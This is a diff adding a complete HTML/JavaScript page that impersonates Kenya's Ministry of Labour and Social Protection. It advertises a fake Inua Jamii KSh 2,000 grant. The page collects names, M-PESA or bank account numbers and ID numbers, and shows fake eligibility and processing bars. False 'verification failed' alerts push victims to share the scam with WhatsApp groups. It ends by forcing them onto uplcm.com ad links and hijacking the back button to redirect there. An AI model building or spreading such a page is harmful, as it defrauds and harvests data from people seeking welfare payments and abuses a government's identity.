@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <title>Inua Jamii Cash Transfer Programme - KSh 2,000</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    
+
+    <!-- Google Fonts -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Hind:wght@400;500;600;700&display=swap">
+    
+    <!-- Bootstrap & FontAwesome -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    
+    <!-- Meta Previews -->
+<!-- ═══════════════════════════════════════════ 
+     META PREVIEW TAGS (Open Graph & Twitter)
+═══════════════════════════════════════════ -->
+<!-- Facebook / WhatsApp / Open Graph -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://metaink.xyz/Inua-Jamii-Fund">
+<meta property="og:title" content="INUA JAMII CASH TRANSFER PROGRAMME - KSh 2,000">
+<meta property="og:description" content="This is to inform the general public that the online portal for the INUA JAMII CASH TRANSFER PROGRAMME is currently open. Eligible beneficiaries are set to receive KSh 2,000 each.">
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhcDqs8iTYFRNZmz3Ys2XFHyBb6tMmIRUzeyJFN8Aom0XCD4QKFGtLCldBpdvqEW9ajhViKT6gqNm29T2Wh6KcbefsYcdvDRVvuJPfhZIJsuxGVYcFNyEnrAuokOg5IXYAizQVTp_lYizMWF7beidahUvXREIUyXHlfN_GjfIs9Nk5wEsp8HmhcnihnY2fk/s1729/39260.png">
+
+<!-- Twitter / X -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:url" content="https://metaink.xyz/Inua-Jamii-Fund">
+<meta name="twitter:title" content="INUA JAMII CASH TRANSFER PROGRAMME - KSh 2,000">
+<meta name="twitter:description" content="This is to inform the general public that the online portal for the INUA JAMII CASH TRANSFER PROGRAMME is currently open. Eligible beneficiaries are set to receive KSh 2,000 each.">
+<meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhcDqs8iTYFRNZmz3Ys2XFHyBb6tMmIRUzeyJFN8Aom0XCD4QKFGtLCldBpdvqEW9ajhViKT6gqNm29T2Wh6KcbefsYcdvDRVvuJPfhZIJsuxGVYcFNyEnrAuokOg5IXYAizQVTp_lYizMWF7beidahUvXREIUyXHlfN_GjfIs9Nk5wEsp8HmhcnihnY2fk/s1729/39260.png">
+    <meta property="og:title" content="Inua Jamii Cash Transfer Programme - KSh 2,000" />
+    <meta property="og:description" content="Government of Kenya Cash Transfer Program" />
+    <meta property="og:type" content="website" />
+
+    <style>
+        /* ═══════════════════════════════════════════ 
+           INUA JAMII THEME & BASE STYLES
+        ═══════════════════════════════════════════ */
+        :root {
+            --kenya-blue: #0056b3;      
+            --kenya-dark: #003366;       
+            --text-color: #333;
+            --bg-gray: #f4f4f4;
+        }
+
+        * { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Hind', sans-serif; 
+            box-sizing: border-box; 
+        }
+        
+        body { 
+            background-color: var(--bg-gray);
+            background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUTtG2c63XU4RF0QP63o-p81hNDBUlylWSVsyzt7gBxxHNrx-vt4uNXxydwMe92smdSFKVGFnW6ADwMjODtAZMEkFkJBQPEBGAgE8ttuoXqo7oYK-ZgyuP3DRuzsctthKjo9D2UzMZoLoBqEjAdJ-HNNedQXv1uc-2fFBcxGkloD4K1VS7nA1sm4aFgLAS/s320/Ps%20and%20older%20person.jpeg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            color: var(--text-color);
+        }
+        
+        a { text-decoration: none; }
+
+        /* ═══════════════════════════════════════════ 
+           HEADER
+        ═══════════════════════════════════════════ */
+        .top-blue-bar {
+            background-color: var(--kenya-blue);
+            height: 45px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding-right: 20px;
+        }
+        
+        .main-header {
+            background: #fff;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #ddd;
+            position: sticky;
+            top: 0;
+            z-index: 900;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .coat-of-arms {
+            height: 60px;
+            width: auto;
+        }
+        .ministry-text h1 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--kenya-dark);
+            margin: 0;
+            line-height: 1.2;
+        }
+        .ministry-text p {
+            font-size: 12px;
+            font-weight: 600;
+            color: #000;
+            margin: 0;
+        }
+        
+        .language-selector {
+            display: flex;
+            align-items: center;
+        }
+
+        .bottom-blue-bar {
+            background-color: var(--kenya-blue);
+            height: 50px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding-right: 20px;
+        }
+        .hamburger-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+        }
+        .hamburger-menu span {
+            display: block;
+            width: 30px;
+            height: 4px;
+            background-color: #000;
+        }
+
+        /* ═══════════════════════════════════════════ 
+           POPUP & BACKGROUND
+        ═══════════════════════════════════════════ */
+        #bgImage {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8); z-index: 999; opacity: 0; pointer-events: none; transition: opacity 0.4s ease;
+        }
+        #bgImage.popup-bg-active { opacity: 1; pointer-events: auto; }
+
+        .popup-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+            opacity: 0; pointer-events: none; transition: opacity 0.4s ease; z-index: 1000;
+        }
+        .popup-overlay.active { opacity: 1; pointer-events: auto; }
+        
+        .popup-box {
+            background-color: #fff;
+            padding: 25px 20px; border-radius: 12px; width: 420px; max-width: 92%;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative;
+            transform: translateY(-30px); transition: transform 0.4s ease; text-align: center;
+            border-top: 5px solid var(--kenya-blue);
+        }
+        .popup-overlay.active .popup-box { transform: translateY(0); }
+        
+        .popup-header-logos { display: flex; justify-content: center; gap: 10px; margin-bottom: 15px; }
+        .popup-header-logos img { height: 60px; width: auto; }
+        
+        .popup-box h2 { font-size: 18px; color: var(--kenya-dark); font-weight: 700; margin-bottom: 10px; line-height: 1.3; }
+        
+        .popup-box .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; margin-bottom: 15px; outline: none; }
+        .popup-box .submit-btn {
+            width: 100%; padding: 14px; background-color: var(--kenya-blue); color: white;
+            border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s;
+        }
+        .popup-box .submit-btn:hover { background-color: var(--kenya-dark); }
+
+        /* ═══════════════════════════════════════════ 
+           MAIN FLOW & UI ELEMENTS
+        ═══════════════════════════════════════════ */
+        #flowWrapper { display: none; position: relative; z-index: 2; padding-bottom: 20px;}
+
+        .post {
+            background: #fff; margin: 20px auto; padding: 25px; max-width: 550px;
+            border: 1px solid #e0e0e0; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .welcome { font-size: 15px; line-height: 1.6; color: #444; text-align: justify; }
+        .amount, #getname { color: var(--kenya-blue); font-weight: 700; }
+        .title { text-align: center; font-weight: 700; color: var(--kenya-dark); font-size: 18px; margin-bottom: 15px; }
+        
+        button.btn-main {
+            display: block; width: 100%; max-width: 320px; height: 52px; color: #fff;
+            border: none; outline: none; font-size: 18px; font-weight: 800; cursor: pointer;
+            border-radius: 8px; margin: 15px auto; background: var(--kenya-blue); transition: background 0.3s ease;
+        }
+        button.btn-main:hover { background: var(--kenya-dark); }
+
+        .phone input, .phone select {
+            width: 100%; height: 50px; font-size: 15px; margin-bottom: 15px; padding: 10px 15px;
+            border: 1px solid #ccc; border-radius: 8px; outline: none; background: #f9f9f9;
+        }
+
+        #loader { text-align: center; padding: 40px 0; display: none; }
+        .spin {
+            width: 50px; height: 50px; border: solid 6px var(--kenya-blue); border-right-color: transparent;
+            border-radius: 50%; margin: 15px auto; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(1turn); } }
+
+        .barr { max-width: 100%; margin: 15px auto; display: flex; align-items: center; gap: 10px; }
+        .fill { flex: 1; height: 30px; border: 2px solid var(--kenya-blue); border-radius: 6px; padding: 2px; }
+        #fill, #fill2 { background: var(--kenya-blue); width: 0%; height: 100%; border-radius: 3px; transition: width 0.1s linear; }
+        .percentage { width: 60px; text-align: right; font-size: 16px; font-weight: bold; color: var(--kenya-blue); }
+
+        #info, #checking, #share, #claim { display: none; }
+
+        /* Receipt Box */
+        .receipt-box {
+            background: #f0f5fa;
+            border: 1px dashed var(--kenya-blue);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .receipt-box p { font-size: 14px; margin-bottom: 8px; }
+        .receipt-box span { font-weight: bold; color: var(--kenya-dark); }
+
+        /* Blinking Status Badge */
+        .status-badge {
+            background-color: #ffe5e5; color: #d32f2f; padding: 4px 10px; border-radius: 12px;
+            font-size: 12px; font-weight: 800; letter-spacing: 0.5px;
+            display: inline-flex; align-items: center; gap: 5px;
+            vertical-align: middle; animation: pulse-red 1.5s infinite; margin-left: 5px;
+        }
+        .status-badge::before {
+            content: ''; display: inline-block; width: 6px; height: 6px;
+            background-color: #d32f2f; border-radius: 50%; animation: blink-dot 1.5s infinite;
+        }
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(211, 47, 47, 0.4); }
+            70% { box-shadow: 0 0 0 5px rgba(211, 47, 47, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(211, 47, 47, 0); }
+        }
+        @keyframes blink-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ═══════════════════════════════════════════ 
+           FOOTER & ABOUT US SECTION
+        ═══════════════════════════════════════════ */
+        .kenya-footer { background: var(--kenya-blue); color: #fff; padding: 40px 20px 30px; position: relative; z-index: 2; }
+        .footer-container { max-width: 800px; margin: 0 auto; }
+        
+        .about-section {
+            background: rgba(255, 255, 255, 0.1); padding: 25px; border-radius: 12px; margin-bottom: 30px;
+            border-left: 5px solid #fff;
+        }
+        .about-section h3 { color: #fff; font-weight: 700; margin-bottom: 15px; font-size: 22px;}
+        .about-section p { color: #e3f2fd; font-size: 15px; line-height: 1.6; margin-bottom: 10px;}
+        .about-section .read-more { color: var(--kenya-dark); font-weight: bold; background: #fff; padding: 5px 10px; border-radius: 4px; display: inline-block; margin-top: 10px; font-size: 14px;}
+        
+        .directorate-item {
+            display: flex; align-items: flex-start; gap: 15px; margin-bottom: 25px;
+            background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 8px;
+        }
+        .directorate-icon {
+            width: 50px; height: 50px; border-radius: 50%; border: 2px solid #fff;
+            display: flex; justify-content: center; align-items: center; color: #fff; font-size: 20px;
+            flex-shrink: 0; background: rgba(255,255,255,0.2);
+        }
+        .directorate-text h4 { font-size: 17px; font-weight: bold; color: #fff; margin-bottom: 8px; }
+        .directorate-text p { font-size: 14px; color: #e3f2fd; margin: 0; line-height: 1.5;}
+
+        .footer-copyright {
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            padding-top: 20px;
+            margin-top: 20px;
+        }
+        .footer-copyright p { font-size: 14px; margin: 0; line-height: 1.6; color: #fff;}
+        .footer-supercounter { margin-top: 20px; text-align: center;}
+
+        @media (max-width: 600px) {
+            .ministry-text h1 { font-size: 14px; }
+            .ministry-text p { font-size: 10px; }
+            .coat-of-arms { height: 45px; }
+            .directorate-item { flex-direction: column; gap: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- TOP BLUE BAR -->
+    <div class="top-blue-bar">
+        <div id="google_translate_element" class="language-selector"></div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="main-header">
+        <div class="header-left">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiizwYHCl0miOncN26dHrnbofBX2GCf-et7jvmSEG4BYz-96wPzLSBm5IXH51tjRaCDv2ZT2M0uGlZbpzjATGXA6etMfrSaDgq4VaMFongaD7eyKazUWABVV5rNlvWXEZZJnJseaMRbZIW55iIfVDGkeezt5DAQL5ef_yXfT61tQQPVxsQRJ2EmV6QVMJH9/s320/logo.png" alt="Kenya Coat of Arms" class="coat-of-arms">
+            <div class="ministry-text">
+                <h1>Ministry of Labour and Social Protection</h1>
+                <p>State Department for Social Protection and Senior Citizen Affairs</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- BOTTOM BLUE BAR -->
+    <div class="bottom-blue-bar">
+        <div class="hamburger-menu">
+            <span></span>
+            <span></span>
+        </div>
+    </div>
+
+    <!-- POPUP BACKGROUND LAYER -->
+    <div id="bgImage" class="popup-bg-active"></div>
+
+    <!-- POPUP MODAL -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-box">
+            <div class="popup-header-logos">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitl6VAExNsNqRNjuJP2D85vA_GMi_0ZNrfTHmd0yglwqe0Jo8gEiTsIWviYQFscB9JJzyqB8B9ZKUwDhD3Ptv_GDSh9II6vzbfZirgxfs5eScbEXv8Rjvz2lb261s5ptC6DPPqejABPux-AZC7g0z9tHx1Cvlq_AzbNyQPxAx3R34GHjtJwHC9W-A5H6V7/s650/socialprotection.jpg" alt="Kenya Logo" style="max-height: 60px; width: auto; max-width: 100%; object-fit: contain;">
+            </div>
+            <h2>INUA JAMII CASH TRANSFER<br>KSh 2,000</h2>
+            <p style="font-size: 14px; color: #555; margin-bottom: 15px;">Enter Your Details to Claim KSh 2,000</p>
+
+            <form id="popupForm">
+                <div class="form-group">
+                    <input type="tel" id="popupPhone" placeholder="Enter M-PESA Number or ID" required>
+                </div>
+                <button type="submit" class="submit-btn">CLAIM KSh 2,000 NOW</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- MAIN FLOW WRAPPER -->
+    <div id="flowWrapper">
+        
+        <!-- PAGE 1: LOADER -->
+        <div class="post" id="loader">
+            <p style="font-weight: bold; color: var(--kenya-blue); font-size: 18px;">Verifying Eligibility...</p>
+            <div class="spin"></div>
+            <div id="num" style="font-weight: bold; font-size: 20px; color: var(--kenya-blue);">0%</div>
+        </div>
+
+        <!-- PAGE 2: INTRO -->
+        <div class="post" id="intro" style="display: none;">
+            <p class="welcome">
+                <center>
+                    The application portal for the <span class="amount">INUA JAMII CASH TRANSFER PROGRAMME</span> is currently open. The programme provides financial assistance to eligible Kenyan citizens. Payments are made through designated payment channels, primarily M-PESA and Bank Accounts.
+                </center> 
+            </p>
+            
+            <button id="go" class="btn-main">APPLY NOW</button>
+        </div>
+
+        <!-- PAGE 3: INFO FORM (Dynamic Fields Added) -->
+        <div class="post" id="info" style="display: none;">
+            <p class="title">ENTER YOUR PERSONAL DETAILS:</p>
+            <div class="phone">
+                <center>
+                    <input type="text" placeholder="Full Name" id="name">
+                    <select id="state">
+                        <option value="" selected disabled>Select County</option>
+                        <option value="Nairobi">Nairobi</option>
+                        <option value="Mombasa">Mombasa</option>
+                        <option value="Kisumu">Kisumu</option>
+                        <option value="Nakuru">Nakuru</option>
+                        <option value="Eldoret">Eldoret</option>
+                        <option value="Thika">Thika</option>
+                        <option value="Malindi">Malindi</option>
+                        <option value="Kitale">Kitale</option>
+                        <option value="Garissa">Garissa</option>
+                        <option value="Kakamega">Kakamega</option>
+                        <option value="Other">Other County</option>
+                    </select>
+
+                    <!-- PAYMENT METHOD DROPDOWN -->
+                    <select id="payment_method">
+                        <option value="" selected disabled>Select Payment Method</option>
+                        <option value="M-PESA">M-PESA</option>
+                        <option value="Bank Account">Bank Account</option>
+                    </select>
+
+                    <!-- M-PESA Input (Hidden by default) -->
+                    <input type="tel" placeholder="M-PESA Phone Number" id="add" style="display: none;">
+
+                    <!-- Bank Account Input (Hidden by default) -->
+                    <input type="text" placeholder="Bank Account Number" id="bank_account" style="display: none;">
+
+                    <!-- ID Number (Optional) -->
+                    <input type="text" placeholder="ID Number (Optional)" id="nums">
+                    <br>
+                    <button id="confirm" class="btn-main">Submit Application</button>
+                </center>
+                <p class="error" style="display:none; color:red; text-align:center;">Please fill all fields!</p>
+            </div>
+        </div>
+
+        <!-- PAGE 4: CHECKING -->
+        <div class="post" id="checking">
+            <p class="title">Processing Application...</p>
+            <div class="barr">
+                <div class="fill"><div id="fill"></div></div>
+                <div class="percentage"><span id="percentage">0%</span></div>
+            </div>
+        </div>
+
+        <!-- PAGE 5: SHARE -->
+        <div class="post" id="share">
+            <div class="receipt-box">
+                <p><b>Applicant Name:</b> <span id="getname"></span></p>
+                <p><b>County:</b> <span id="getstate"></span></p>
+                <p><b>Payment Method:</b> <span id="getmethod"></span></p>
+                <p><b>Account Number:</b> <span id="getaccount"></span></p>
+                <p><b>ID Number:</b> <span id="getnum"></span></p>
+                
+                <p style="margin-top: 10px; border-top: 1px solid #ddd; padding-top: 10px;">
+                    <b>Transaction Status:</b> <span class="status-badge">PENDING</span>
+                </p>
+            </div>
+
+            <h3 style="color: var(--kenya-blue); text-align: center; margin-bottom: 10px;"> Congratulations!</h3>
+            <p style="font-size: 15px; color: #333; text-align: center; margin-bottom: 15px;">
+                Your application has been <b>successfully received</b>, and you have been <b>pre-qualified</b> to receive the KSh 2,000 Grant. 
+            </p>
+            <p class="tip" style="text-align: center; font-size: 14px; color: #555;">To finalize your payment, please complete the human verification process below. Once verified, your account will be credited within 24–48 hours.</p>
+            
+            <br>
+            <p class="tip" style="font-size: 14px; color: #555;">1. Share this information with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+            <p class="tip" style="font-size: 14px; color: #555;">2. You will be redirected automatically to our "Human verification approved page" after the GREEN verification bar is filled.</p>
+            
+            <button id="whatsapp" class="btn-main" style="background: #25D366; color: white;"><i class="fab fa-whatsapp"></i> SHARE</button>
+            
+            <div class="barr">
+                <div class="fill"><div id="fill2"></div></div>
+                <div class="percentage"><span id="percentage2">0%</span></div>
+            </div>
+        </div>
+
+        <!-- PAGE 6: CLAIM -->
+        <div class="post" id="claim">
+            <p class="title">Payment Approved</p>
+            <p style="font-size: 15px; text-align: center; color: #555; margin-bottom: 20px;">
+                Your information has been received. Click the links below to approve your payment to the M-PESA number or Bank account you provided during the registration process. Please note that payments may take 24 to 48 hours to reflect.
+            </p>
+            
+            <!-- Ad Buttons -->
+            <a onclick="window.open('https://uplcm.com/4/10077877')" href="https://uplcm.com/4/10077877">
+                <button class="btn-main" style="background: var(--kenya-blue); font-size: 16px; margin-bottom: 10px;">GET PAYMENT</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/9742092')" href="https://uplcm.com/4/9742092">
+                <button class="btn-main" style="background: var(--kenya-blue); font-size: 16px; margin-bottom: 10px;">GET CONFIRMATION CODE</button>
+            </a>
+            <a onclick="window.open('https://uplcm.com/4/9742301')" href="https://uplcm.com/4/9742301">
+                <button class="btn-main" style="background: var(--kenya-blue); font-size: 16px; margin-bottom: 10px;">CHECK PAYMENT STATUS</button>
+            </a>
+            
+            <button id="offer" class="btn-main" style="background: #ffc107; color: #000; margin-top: 15px; font-weight: 800;">APPROVE PAYMENT</button>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="kenya-footer">
+        <div class="footer-container">
+            
+            <!-- ABOUT US -->
+            <div class="about-section">
+                <h3>About Us</h3>
+                <p>
+                    The State Department for Social Protection and Senior Citizen Affairs falls under the Ministry of Labour and Social Protection, established following the re-organization of Government through Executive Order No. 1 of 2023.
+                </p>
+                <span class="read-more">Read More ....</span>
+            </div>
+
+            <!-- DIRECTORATE 1 -->
+            <div class="directorate-item">
+                <div class="directorate-icon"><i class="fas fa-hand-holding-usd"></i></div>
+                <div class="directorate-text">
+                    <h4>Directorate of Social Assistance</h4>
+                    <p>Payment of cash transfers to Older Persons, Persons with disabilities and Orphans and Vulnerable Children.</p>
+                </div>
+            </div>
+
+            <!-- DIRECTORATE 2 -->
+            <div class="directorate-item">
+                <div class="directorate-icon"><i class="fas fa-users"></i></div>
+                <div class="directorate-text">
+                    <h4>Directorate of Social Development</h4>
+                    <p>Mobilizing and empowering individuals, families, groups, persons with disabilities, older persons and other vulnerable groups for growth improved livelihoods.</p>
+                </div>
+            </div>
+
+            <!-- DIRECTORATE 3 -->
+            <div class="directorate-item">
+                <div class="directorate-icon"><i class="fas fa-sync-alt"></i></div>
+                <div class="directorate-text">
+                    <h4>National Social Protection Secretariat</h4>
+                    <p>Facilitating integration, coordination and harmonization of social protection programmes in kenya under a national social protection system.</p>
+                </div>
+            </div>
+
+            <!-- DIRECTORATE 4 -->
+            <div class="directorate-item">
+                <div class="directorate-icon"><i class="fas fa-book-open"></i></div>
+                <div class="directorate-text">
+                    <h4>Directorate of Adult Learning Education</h4>
+                    <p>Providing literacy and education to out-of-school youth, adults and older members of society in order to create a well-informed and productive human resource that is self-reliant and who live in dignity, respect and free from abuse.</p>
+                </div>
+            </div>
+
+            <!-- COPYRIGHT & SUPERCOUNTER -->
+            <div class="footer-copyright">
+                <p>&copy; Copyright 2026 | State Department for Social Protection and Senior Citizen Affairs | All Rights Reserved.</p>
+                
+                <div class="footer-supercounter">
+                    <script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+                    <script type="text/javascript">sc_online_i(1738683,"ffffff","ffffff");</script>
+                </div>
+            </div>
+
+        </div>
+    </footer>
+
+    <!-- GOOGLE TRANSLATE SCRIPT -->
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en', 
+                includedLanguages: 'en,sw,fr,de,zh-CN,ja', 
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+            }, 'google_translate_element');
+        }
+    </script>
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+    <!-- JQUERY -->
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    
+    <script>
+        $(document).ready(function () {
+            
+            // POPUP LOGIC
+            var popupOverlay = document.getElementById('popupOverlay');
+            var popupForm = document.getElementById('popupForm');
+            var popupPhone = document.getElementById('popupPhone');
+            var bgImage = document.getElementById('bgImage');
+
+            setTimeout(function () {
+                popupOverlay.classList.add('active');
+            }, 500);
+
+            popupForm.addEventListener('submit', function (e) {
+                e.preventDefault();
+                var phone = popupPhone.value.trim();
+
+                if (phone.length < 6) {
+                    alert('Please enter a valid M-PESA number or ID');
+                    return;
+                }
+
+                window.savedPhone = phone;
+
+                popupOverlay.classList.remove('active');
+                bgImage.classList.remove('popup-bg-active');
+                
+                $("#flowWrapper").show();
+                $("#loader").show();
+                var i = 0;
+                var interval = setInterval(function () {
+                    i++;
+                    $("#num").text(i + "%");
+                    if (i >= 100) {
+                        clearInterval(interval);
+                        $("#loader").hide();
+                        $("#intro").show();
+                    }
+                }, 30);
+            });
+
+            // MAIN FLOW LOGIC
+            $("#go").click(function () {
+                $("#intro").hide();
+                $("#info").fadeIn(500);
+                if(window.savedPhone) {
+                    $("#add").val(window.savedPhone);
+                }
+            });
+
+            // DYNAMIC PAYMENT METHOD LOGIC
+            $('#payment_method').change(function() {
+                var method = $(this).val();
+                if(method === 'M-PESA') {
+                    $('#add').show();
+                    $('#bank_account').hide();
+                } else if(method === 'Bank Account') {
+                    $('#add').hide();
+                    $('#bank_account').show();
+                } else {
+                    $('#add').hide();
+                    $('#bank_account').hide();
+                }
+            });
+
+            // FORM SUBMISSION VALIDATION
+            $("#confirm").click(function () {
+                var name = $("#name").val().trim();
+                var method = $("#payment_method").val();
+                var mpesaNum = $("#add").val().trim();
+                var bankNum = $("#bank_account").val().trim();
+                var idNum = $("#nums").val().trim();
+
+                // Check Name and Payment Method
+                if (name.length < 3 || !method) {
+                    $(".error").text("Please enter your Full Name and select a Payment Method!").fadeIn(500);
+                    return;
+                }
+
+                // Check M-PESA or Bank based on selection
+                if (method === 'M-PESA' && mpesaNum.length < 8) {
+                    $(".error").text("Please enter a valid M-PESA number!").fadeIn(500);
+                    return;
+                }
+                if (method === 'Bank Account' && bankNum.length < 5) {
+                    $(".error").text("Please enter a valid Bank Account number!").fadeIn(500);
+                    return;
+                }
+                
+                // Passed Validation
+                $(".error").hide();
+                $("#info").hide();
+                $("#checking").fadeIn(500);
+
+                // Populate Receipt
+                $("#getname").text(name);
+                $("#getstate").text($("#state").val());
+                $("#getmethod").text(method);
+                
+                if (method === 'M-PESA') {
+                    $("#getaccount").text(mpesaNum);
+                } else {
+                    $("#getaccount").text(bankNum);
+                }
+                
+                // ID Number is optional
+                $("#getnum").text(idNum || "Not Provided");
+
+                var i = 0;
+                var interval = setInterval(function () {
+                    i++;
+                    $("#percentage").text(i + "%");
+                    $("#fill").css("width", i + "%");
+                    
+                    if (i == 70) {
+                        i = 69; 
+                        setTimeout(function () { i = 70; }, 1000);
+                    }
+                    
+                    if (i >= 100) {
+                        clearInterval(interval);
+                        setTimeout(function () {
+                            $("#checking").hide();
+                            $("#share").fadeIn(500);
+                        }, 500);
+                    }
+                }, 30);
+            });
+
+            var width = 0;
+            var shareText = "*INUA JAMII CASH TRANSFER 2026*%0A%0AThe Government of Kenya is giving out *KSh 2,000 Grant* to support citizens. %0A%0AAPPLY HERE👉: https://metaink.xyz/Inua-Jamii-Fund %0A%0A*_Forward To Other Kenyans To Benefit._*";
+            var shareUrl = "whatsapp://send?text=" + shareText;
+            var redirectUrl = "https://uplcm.com/4/10077877"; 
+
+            $("#whatsapp").click(function () {
+                window.location.href = shareUrl;
+                
+                if (width == 0) { width += 50; } 
+                else if (width == 50) { alert("Verification Failed!\nYou must share with at least 5 groups or 15 friends to complete the process."); width += 15; } 
+                else if (width == 65) { width += 5; } 
+                else if (width == 70) { alert("Almost there! Please share to one more group to verify."); width += 10; } 
+                else if (width == 80) { alert("Processing... Please share again."); width += 5; } 
+                else if (width == 85) { width += 2; } 
+                else if (width == 87) { width += 1; } 
+                else if (width == 88) { width += 2; } 
+                else if (width == 90) { width += 1; } 
+                else if (width == 91) { width += 1; } 
+                else if (width == 92) { width += 1; } 
+                else if (width == 93) { width += 1; } 
+                else if (width == 94) { width += 1; } 
+                else if (width == 95) { width += 1; } 
+                else if (width == 96) { width += 2; } 
+                else { 
+                    $("#share").hide(); 
+                    $("#claim").fadeIn(1000); 
+                    return; 
+                }
+                
+                setTimeout(function () {
+                    $("#fill2").css("width", width + "%");
+                    $("#percentage2").text(width + "%");
+                }, 1000);
+            });
+
+            $("#offer").click(function () {
+                window.open(redirectUrl, "_blank");
+            });
+
+            // AGGRESSIVE BACK BUTTON REDIRECT
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, document.URL);
+                window.location.href = redirectUrl; 
+            });
+            
+            history.pushState(null, null, document.URL);
+
+            window.onhashchange = function () { jp(); }; 
+            function hh() { history.pushState(history.length + 1, "message", "#" + Math.random()); } 
+            function jp() { fh(); } 
+            setTimeout('hh();', 500); 
+            function fh() { location.href = redirectUrl; }
+        });
+    </script>
+</body>
+</html>
